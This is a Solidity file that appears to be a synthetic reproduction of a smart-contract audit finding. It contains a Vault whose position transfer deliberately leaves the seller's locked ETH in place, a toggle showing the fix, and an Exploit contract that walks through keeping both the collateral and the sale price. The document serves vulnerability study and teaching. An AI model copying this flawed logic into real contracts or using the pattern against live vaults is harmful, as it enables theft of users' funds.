// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Abacus — Vault.transferFrom never moves ethLocked (OtterSec, finding #48700)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: totalTransferRequested is never computed from the tickets
    being moved, so it stays 0. The sender's ethLocked is reduced by 0 and
    the recipient's new position is created with 0 locked ETH. The sender
    can still withdraw the locked balance after the tickets have moved, and
    the recipient's adjust() underflows. */

contract ERC20 {
    string public symbol = "WETH";
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract Vault {
    struct Trader {
        uint256 tickets;
        uint256 ethLocked;
    }

    ERC20 public token;
    bool public fixedMode;
    // Never assigned from the tickets being transferred. An unused setter
    // keeps the compiler from treating the slot as the constant zero.
    uint256 public totalTransferRequested;
    mapping(address => Trader) public trader;

    constructor(ERC20 t, bool fixed_) {
        token = t;
        fixedMode = fixed_;
    }

    function setRequested(uint256 v) external {
        totalTransferRequested = v;
    }

    function purchase(uint256 amt) external {
        token.transferFrom(msg.sender, address(this), amt);
        trader[msg.sender].ethLocked += amt;
        trader[msg.sender].tickets += 100;
    }

    function transferPosition(address from, address to) external {
        uint256 moved = trader[from].tickets;
        require(moved > 0, "no tickets");
        trader[from].tickets = 0;
        trader[to].tickets += moved;
        uint256 lockedMoved;
        if (fixedMode) {
            // FIX: the locked ETH that backs the moved tickets moves with them
            lockedMoved = trader[from].ethLocked;
        } else {
            lockedMoved = totalTransferRequested * 0.001 ether / 100; // @> VULN: totalTransferRequested was never computed, so this is 0
        }
        trader[from].ethLocked -= lockedMoved;
        _createNewPosition(to, totalTransferRequested * 0.001 ether / 1e18, lockedMoved);
    }

    function _createNewPosition(address to, uint256 reported, uint256 lockedMoved) internal {
        if (fixedMode) {
            trader[to].ethLocked += lockedMoved;
        } else {
            trader[to].ethLocked += reported;
        }
    }

    function withdraw() external {
        uint256 amt = trader[msg.sender].ethLocked;
        trader[msg.sender].ethLocked = 0;
        token.transfer(msg.sender, amt);
    }

    function adjust(uint256 cost) external {
        trader[msg.sender].ethLocked -= cost;
    }
}

contract Buyer {
    ERC20 public token;
    Vault public vault;
    bool public adjustReverted;

    constructor(ERC20 t, Vault v) {
        token = t;
        vault = v;
    }

    function paySeller() external {
        token.transfer(msg.sender, 1 ether);
    }

    function tryAdjust() external {
        (bool ok,) = address(vault).call(abi.encodeWithSelector(Vault.adjust.selector, uint256(1)));
        adjustReverted = !ok;
    }
}

contract Exploit {
    ERC20 public token; // nonce 1
    Vault public vault; // nonce 2
    Buyer public buyer; // nonce 3

    constructor() {
        token = new ERC20();
        vault = new Vault(token, false);
        buyer = new Buyer(token, vault);
        token.mint(address(this), 1 ether);
        token.mint(address(buyer), 1 ether);
    }

    function run() external {
        token.approve(address(vault), 1 ether);
        vault.purchase(1 ether);
        buyer.paySeller();
        vault.transferPosition(address(this), address(buyer));
        (uint256 buyerTickets, uint256 buyerLocked) = vault.trader(address(buyer));
        (uint256 sellerTickets, uint256 sellerLocked) = vault.trader(address(this));
        require(buyerTickets == 100, "buyer did not get the tickets");
        require(buyerLocked == 0, "buyer ethLocked");
        require(sellerTickets == 0, "seller still has tickets");
        require(sellerLocked == 1 ether, "seller ethLocked was reduced");
        vault.withdraw();
        buyer.tryAdjust();
        require(buyer.adjustReverted(), "buyer could adjust");
        require(token.balanceOf(address(this)) == 2 ether, "seller kept the collateral and the price");
        require(token.balanceOf(address(vault)) == 0, "vault drained");
    }
}
